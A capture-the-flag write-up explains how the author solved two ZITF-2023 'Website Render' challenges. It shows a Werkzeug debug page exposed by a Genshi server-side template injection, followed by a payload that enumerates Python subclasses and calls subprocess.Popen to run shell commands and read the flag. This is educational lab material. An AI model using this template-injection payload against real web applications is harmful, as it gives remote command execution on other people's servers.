---
title: ZITF-2023 - Website_Render_1&2
date: 2023-03-20 +0200
tags: [Web security, Server-Side template injection]
categories: [Write-ups]
---

# Web Application Analysis

The web interface remained consistent across both challenges. It was a straightforward site that primarily rendered HTML content.

![website](assets/Website_render_1&2/website.png)


## Website Render 1 - Initial Render Analysis

![pres1](assets/Website_render_1&2/wabsite_rendre.PNG)

To take advantage of this site, I leveraged a Server-Side Template Injection (SSTI) vulnerability. This flaw permits the execution of arbitrary code by embedding variables within the templates.

Initially, the website restricted the parsing of code outside of HTML tags. To circumvent this safeguard, I enclosed all my payloads within `<p>` tags.

I attempted to initiate the exploit using the `${variable}` syntax.

!["ssti_reco"](assets/Website_render_1&2/ssti_reco.PNG)

Full output : 

```html
<!doctype html>
<html lang=en>
  <head>
    <title>genshi.template.eval.UndefinedError: "haha" not defined
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "FwWhDDaB2pGJMQ84Qck9";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>UndefinedError</h1>
<div class="detail">
  <p class="errormsg">genshi.template.eval.UndefinedError: &#34;haha&#34; not defined
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
  <ul><li><div class="frame" id="frame-140111860320000">
  <h4>File <cite class="filename">"&lt;string&gt;"</cite>,
      line <em class="line">1</em>,
      in <code class="function">&lt;Expression &#39;haha&#39;&gt;</code></h4>
  <div class="source "></div>
</div>
</ul>
  <blockquote>genshi.template.eval.UndefinedError: &#34;haha&#34; not defined
</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;&lt;string&gt;&#34;, line 1, in &lt;Expression &#39;haha&#39;&gt;
genshi.template.eval.UndefinedError: &#34;haha&#34; not defined
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "<string>", line 1, in <Expression 'haha'>
genshi.template.eval.UndefinedError: "haha" not defined


-->
```

As observed at the end of the error message, Python was the underlying language, suggesting the application was likely powered by Flask.

To execute code using this vulnerability, it's essential to locate a library such as `os` or `subprocess`. I utilized the following statement to list available libraries:

```python
"".__class__.__mro__[1].__subclasses__()
```

This approach effectively enumerates the accessible subclasses.

!["ssti"](assets/Website_render_1&2/ssti.PNG)

By examining the output, I identified `subprocess.Popen` as a viable option.

!["ssti1"](assets/Website_render_1&2/ssti1.PNG)

This method enables the execution of system commands.

After determining the index of this library (which was 528 after several attempts), I crafted the following command to list directory contents:

```
<p>${"".__class__.__mro__[1].__subclasses__()[528]("ls", shell=True, stdout=-1).communicate()}</p>
```

!["ssti_ls1"](assets/Website_render_1&2/ssti_ls1.PNG)

The output revealed a directory named `flag`. A subsequent `ls` command within this directory exposed the `flag.txt` file.

!["ssti2"](assets/Website_render_1&2/ssti2.PNG)

This secured the first flag, thereby unlocking the subsequent challenge.


## Website Render 2 - Secondary Render Analysis

!["chall_head"](assets/Website_render_1&2/website_render2.PNG)

This challenge mirrored the first one closely. The primary distinction was the flag's location in a different directory, necessitating the use of `ls` to locate it.

!["sstiv2"](assets/Website_render_1&2/ssti_v2.PNG)

With the payload developed during the initial challenge, addressing the second challenge was straightforward.
